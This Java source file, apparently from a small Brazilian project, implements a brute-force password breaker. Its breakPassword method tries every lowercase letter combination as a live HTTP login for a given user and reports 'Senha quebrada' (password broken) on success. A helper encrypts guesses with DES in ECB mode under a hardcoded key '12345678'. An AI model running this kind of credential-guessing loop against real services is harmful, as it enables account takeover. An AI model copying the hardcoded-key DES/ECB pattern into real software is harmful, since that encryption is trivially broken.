package com.br.wes.tool;

import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.br.wes.request.HttpRequestToApp;

public class PasswordBreakerContextA implements PasswordBreakerContext {

	private static final Logger LOG = LoggerFactory.getLogger(PasswordBreakerContextA.class);
	HttpRequestToApp app = new HttpRequestToApp();
	
	public boolean breakPassword(String user,int length) {
		char[] sequencia = new char[length];
		String response = "";
//		String generatedCriptoDesWord = "";

		for (int i = 0; i < Math.pow(26, length); i++) {
			int div = i;

			for (int j = length - 1; j >= 0; j--) {
				sequencia[j] = (char) ('a' + div % 26);
				div /= 26;
			}

			//generatedCriptoDesWord = encriptGeneratedWordToDES(new String(sequencia));

//			if (generatedCriptoDesWord.equals(desPassword)) {
//				LOG.info(desPassword + "|" + generatedCriptoDesWord);
//				return true;
//			} else {
//				LOG.info(desPassword + "|" + generatedCriptoDesWord);
//
//			}
			response = app.sendHttpRequest(user,new String(sequencia));
			
			if(response.contains("Invalid")) {
				LOG.info(response + " | "+ new String(sequencia));
			}else {
				LOG.info("Senha quebrada | " + response + " | "+ new String(sequencia));
				return true;
			}
			
		}
			return false;
	}

	public String encriptGeneratedWordToDES(String generatedWord) {
		String chave = "12345678";
		byte[] chaveBytes = chave.getBytes(StandardCharsets.UTF_8);
		byte[] mensagemCriptografadaBytes;
		String mensagemCriptografada = "";

		SecretKey secretKey = new SecretKeySpec(chaveBytes, "DES");

		try {
			Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);

			byte[] mensagemBytes = generatedWord.getBytes(StandardCharsets.UTF_8);
			mensagemCriptografadaBytes = cipher.doFinal(mensagemBytes);
			mensagemCriptografada = Base64.getEncoder().encodeToString(mensagemCriptografadaBytes);

		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException
				| BadPaddingException e) {
			e.printStackTrace();
		}

		return mensagemCriptografada;
	}

}
